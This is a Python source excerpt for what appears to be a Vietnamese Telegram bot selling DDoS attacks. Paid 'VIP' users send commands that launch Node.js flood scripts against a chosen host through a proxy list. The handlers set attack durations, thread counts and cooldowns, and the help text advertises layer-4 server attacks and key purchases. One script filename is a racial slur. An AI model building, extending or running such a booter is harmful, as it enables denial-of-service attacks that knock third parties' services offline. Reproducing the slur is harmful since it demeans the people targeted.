...
- Nếu bạn có nhu cầu mua key vip vui lòng sử dụng lệnh /hdsdhdsd
...
- /layer4 : Coi các lệnh tấn công server gồm ip, port (layer4).
'''
    bot.reply_to(message, help_text)
...
def attack_command(message):
    ...
    if method in ['VIP', 'VIP2', 'VIP3', 'VIP4', 'VIP5', 'VIP6', 'VIP7', 'VIP8', 'VIP9', 'VIP10', 'VIP11', 'VIP12', 'VIP13', 'VIP14', 'VIP16', 'VIP15', 'TCP-HOME', 'TCP-BYPASS']:
        ...
        if method == 'VIP':
            command = ["node", "vip.js", host, "100", "6", "proxy.txt", "64"]
            duration = 100
        elif method == 'VIP2':
            command = ["node", "HTTPS-TLS.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP3':
            command = ["node", "http-smack.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP4':
            command = ["node", "4.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP5':
            command = ["node", "vip2.js", host, "100", "6", "proxy.txt", "64"]
            duration = 100
        elif method == 'VIP6':
            command = ["node", "6.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP7':
            command = ["node", "TLSV1.js", host, "100", "6", "64", "proxy.txt", "PRI"]
            duration = 100
        elif method == 'VIP8':
            command = ["node", "TLSV3.js", host, "100", "6", "64", "proxy.txt", "PRI"]
            duration = 100
        elif method == 'VIP9':
            command = ["node", "DESTROY.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP10':
            command = ["node", "http-load.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP11':
             command = ["node", "https.js", host, "100", "64", "6", "proxy.txt"]
             duration = 100
        elif method == 'VIP12':
            command = ["node", "love.js", host, "100", "6",  "proxy.txt", "64", "0"]
            duration = 100
        elif method == 'VIP13':
            command = ["node", "HTTPS-BYPASSv2.js", host, "100", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP14':
            command = ["node", "BYPASS-V3.js", "GET", host, "proxy.txt", "100", "64", "6"]
            duration = 100
        elif method == 'VIP15':
            command = ["node", "nigger.js", host, "100", "64", "6", "proxy.txt"]
            duration = 100
        elif method == 'VIP16':
            command = ["node", "vip3.js", host, "100", "6", "proxy.txt", "64"]
            duration = 100
        elif method == 'TCP-BYPASS':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["node", "TCPBYPASS.js", host, "6", "100" "proxy.txt"]
            duration = 100
        ...
        cooldown_dict[username] = {'attackvip': current_time}
...
def attack_command(message):
    ...
    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attackvip', 0) < 200:
        remaining_time = int(200 - (current_time - cooldown_dict[username].get('attackvip', 0)))
    ...
    if method in ['VIP', 'VIP2', 'VIP3', 'VIP4', 'VIP5', 'VIP6', 'VIP7', 'VIP8', 'VIP9', 'VIP10', 'VIP11', 'VIP12', 'VIP13', 'VIP14', 'VIP16', 'VIP15', 'TCP-HOME', 'TCP-BYPASS']:
        # Update the command and duration based on the selected method
        if method == 'VIP':
            command = ["node", "vip.js", host, "200", "8", "proxy.txt", "64"]
            duration = 200
        elif method == 'VIP2':
            command = ["node", "HTTPS-TLS.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP3':
            command = ["node", "http-smack.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP4':
            command = ["node", "4.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP5':
            command = ["node", "vip2.js", host, "200", "8", "proxy.txt", "64"]
            duration = 200
        elif method == 'VIP6':
            command = ["node", "6.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP7':
            command = ["node", "TLSV1.js", host, "200", "8", "64", "proxy.txt", "PRI"]
            duration = 200
        elif method == 'VIP8':
            command = ["node", "TLSV3.js", host, "200", "8", "64", "proxy.txt", "PRI"]
            duration = 200
        elif method == 'VIP9':
            command = ["node", "DESTROY.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP10':
            command = ["node", "http-load.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP11':
             command = ["node", "https.js", host, "200", "64", "8", "proxy.txt"]
             duration = 200
        elif method == 'VIP12':
            command = ["node", "love.js", host, "200", "8",  "proxy.txt", "64", "0"]
            duration = 200
        elif method == 'VIP13':
            command = ["node", "HTTPS-BYPASSv2.js", host, "200", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP14':
            command = ["node", "BYPASS-V3.js", "GET", host, "proxy.txt", "200", "64", "8"]
            duration = 200
        elif method == 'VIP15':
            command = ["node", "nigger.js", host, "200", "64", "8", "proxy.txt"]
            duration = 200
        elif method == 'VIP16':
            command = ["node", "vip3.js", host, "200", "8", "proxy.txt", "64"]
            duration = 200
        elif method == 'TCP-BYPASS':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["node", "TCPBYPASS.js", host, "8", "200" "proxy.txt"]
            duration = 200
        elif method == 'TCP-HOME':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
